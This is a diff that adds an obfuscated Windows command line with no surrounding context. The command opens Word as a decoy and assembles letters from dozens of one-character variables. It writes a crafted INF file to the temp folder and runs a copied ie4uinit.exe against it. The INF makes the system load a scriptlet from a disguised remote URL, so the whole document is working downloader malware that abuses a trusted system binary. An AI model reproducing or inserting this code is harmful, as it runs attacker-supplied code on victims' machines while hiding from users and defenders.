@@ -1,0 +1,27 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %f in ("resigne=et" "nonperver=e" "resinere=t" "life=al" ) do @set %~f) &&
+  (for %x in ("3") do @set "exsci=%~x") &&
+  call(for %q in ("2") do @set "loveli=%~q") &&
+  (for %l in ("e") do @set "nephitechei=%~l") &&
+  (for %i in ("o") do @set "ring=%~i") &&
+  (for %y in ("g") do @set "commun=%~y") &&
+  (for %o in ("d") do @set "bengali=%~o") &&
+  call(for %d in ("i") do @set "mingledl=%~d") &&
+  (for %r in ("7") do @set "repurposed=%~r") &&
+  (for %o in ("=") do @set "basilemmasu=%~o") &&
+  (for %i in ("f") do @set "laserpiti=%~i") &&
+  call(for %w in ("1") do @set "goldar=%~w") &&
+  call(for %f in ("p") do @set "milki=%~f") &&
+  (for %a in ("t") do @set "unma=%~a") &&
+  call(for %q in ("A") do @set "iconom=%~q") &&
+  call(for %b in ("x") do @set "adma=%~b") &&
+  callcall(for %a in ("e") do @set "nephitechei=%~a") &&
+  callcall(for %k in ("]") do @set "miszo=%~k") &&
+  (for %y in ("c") do @set "untri=%~y") &&
+  callcall(for %g in (".") do @set "hessonite=%~g") &&
+  call(for %e in ("t") do @set "unma=%~e") &&
+  (for %u in ("v") do @set "syncret=%~u") &&
+  callcall(for %v in ("n") do @set "stallinge=%~v") &&
+  callcallcall(for %d in ("s") do @set "sperma=%~d") &&
+  (for %r in ("[version]" "signature=$windowsnt$" "[strings]" "servicename= 'gullibility'" "shortsvcname= 'gullibility'" "unlivelydis=." "paran=/" "trispor=:" "hedg=N" "dissc=c" "reglues=d" "gayness=e" "espa=f" "pallad=g" "westhamd=h" "overlaste=i" "langrelsr=j" "perturbe=l" "inexpectati=m" "initiallin=n" "unchurch=o" "whitecha=r" "titrimetri=s" "calliste=t" "discipline=u" "underfl=x" "[F33EA]" "%overlaste%e%discipline%i%initiallin%i%calliste%.%overlaste%n%espa%" "[destinationdirs]" "defaultdestdir=11" "F33EA=01" "[usucap_544]" "s%dissc%r%unchurch%b\" "%langrelsr%.%reglues%l%perturbe%,%hedg%I,%westhamd%t%calliste%p%trispor%/%paran%s%underfl%v%reglues%a%unlivelydis%j%gayness%s%titrimetri%i%dissc%a%titrimetri%u%pallad%g%titrimetri%.%dissc%o%inexpectati%/%whitecha%o%discipline%t%gayness%t%unchurch%" "[defaultinstall.windows7]" "delfiles=F33EA" "Un\" "Register\" "OCXs=usucap_544" ) do @echo %~r) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
